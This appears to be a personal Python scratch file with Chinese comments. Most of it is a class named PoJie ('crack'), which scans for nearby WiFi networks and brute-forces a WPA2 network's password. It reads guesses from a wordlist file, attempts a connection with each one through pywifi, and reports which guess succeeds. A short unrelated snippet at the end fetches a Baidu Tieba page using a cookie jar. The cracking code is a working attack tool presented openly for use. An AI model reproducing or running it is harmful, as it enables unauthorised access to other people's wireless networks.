import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义
from asyncio.tasks import sleep
class PoJie():
    def __init__(self,path):
        self.file=open(path,"r",errors="ignore")
        wifi = pywifi.PyWiFi() #抓取网卡接口
        self.ifaces = wifi.interfaces()[0]#抓取第一个无限网卡
        if self.ifaces.status() == pywifi.const.IFACE_CONNECTED:
            print('网络已连接...')
        else:
            print('网络未连接...')
        print(self.ifaces.name())
        self.ifaces.scan()  # 扫描
        time.sleep(5)
        bsses = self.ifaces.scan_results()  # 扫描到的结果
        for pjwifi in bsses:
            print(pjwifi.ssid)  # 所有WiFi名
            print(pjwifi.bssid)  # mac地址
            print(pjwifi.signal)  # 信号强度(值越大信号越强)
        self.ifaces.disconnect() #测试链接断开所有链接

        time.sleep(1) #休眠1秒
        #测试网卡是否属于断开状态，
        assert self.ifaces.status() in\
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def readPassWord(self):
            print("开始破解：")
            while True:
                try:
                    myStr =self.file.readline()
                    if not myStr:
                        break
                    myStr=myStr[:-1]
                    print(myStr)
                    bool1=self.test_connect(myStr)
                    if bool1:
                        print("密码正确:"+myStr)
                        break
                    else:
                        print("密码错误:"+myStr)
                    sleep(1)
                except:
                    continue

    def test_connect(self,findStr):#测试链接

        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid ="wifi名称" #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码

        self.ifaces.remove_all_network_profiles() #删除所有的wifi文件
        tmp_profile = self.ifaces.add_network_profile(profile)#设定新的链接文件
        self.ifaces.connect(tmp_profile)#链接
        time.sleep(5)

        if self.ifaces.status() == const.IFACE_CONNECTED:  #判断是否连接上
            isOK=True
        else:
            isOK=False
        self.ifaces.disconnect() #断开
        time.sleep(1)
        #检查断开状态
        assert self.ifaces.status() in\
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return isOK


    def __del__(self):
        self.file.close()

path=r"C:\Users\lenve\Desktop\wifi.txt"
# start=PoJie(path)
# start.readPassWord()

import http.cookiejar
from urllib import request
url='http://tieba.baidu.com/p/1753935195'
n=request.urlopen(url=url)
m=n.read()
print(m)
r=request.Request(url=url)
r.add_header('user-agent','Mozilla/5.0')
b=request.urlopen(r)
print(b.read())
cookie=http.cookiejar.CookieJar()
OPENER=request.build_opener(request.HTTPCookieProcessor(cookie))
request.install_opener(OPENER)
response=request.urlopen(url=url)
print(response.read())
print(cookie)
